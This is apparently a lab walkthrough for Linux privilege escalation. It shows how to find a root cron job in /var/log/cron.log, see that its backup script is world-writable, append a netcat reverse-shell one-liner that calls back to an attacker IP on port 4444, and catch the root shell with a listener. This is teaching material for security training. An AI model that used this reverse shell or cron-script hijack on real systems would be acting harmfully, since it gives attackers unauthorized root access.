Search for installed cron jobs by inspecing **/var/log/cron.log** for running cron jobs. We see that there is acron job executed in the context of the root user.
```plaintext
student@debian:~$ grep "CRON" /var/log/cron.log
Oct  3 17:30:01 debian CRON[1594]: (root) CMD (/var/scripts/user_backups.sh)
Oct  3 17:35:01 debian CRON[1689]: (root) CMD (/var/scripts/user_backups.sh)
student@debian:~$
```

We know the location is /var/scripts/user_backups.sh. Let's inspect the script.
```plaintext
student@debian:~$ cat /var/scripts/user_backups.sh 
#!/bin/bash

cp -rf /home/student/ /var/backups/student/
student@debian:~$ 
```

View the permissions on user_backups.sh. It is writable by every local user.
```plaintext
student@debian:~$ ls -lah /var/scripts/user_backups.sh 
-rwxrwxrwx 1 root root 57 Mar 10  2020 /var/scripts/user_backups.sh
student@debian:~$
```

Edit user_backups.sh and add a reverse shell one-liner.
```plaintext
student@debian:~$ cd /var/scripts
student@debian:/var/scripts$ echo >> user_backups.sh
student@debian:/var/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.214 4444 >/tmp/f" >> user_backups.sh
student@debian:/var/scripts$ cat user_backups.sh 
#!/bin/bash

cp -rf /home/student/ /var/backups/student/

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.214 4444 >/tmp/f
```

Setup a netcat listener on Kali
```plaintext
kali@kali:~$ sudo nc -lnvp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
```

At the most, we will wait for 5 minutes since user_backups.sh is supposed to run every 5 minutes. Notice we get a shell when the cron job runs
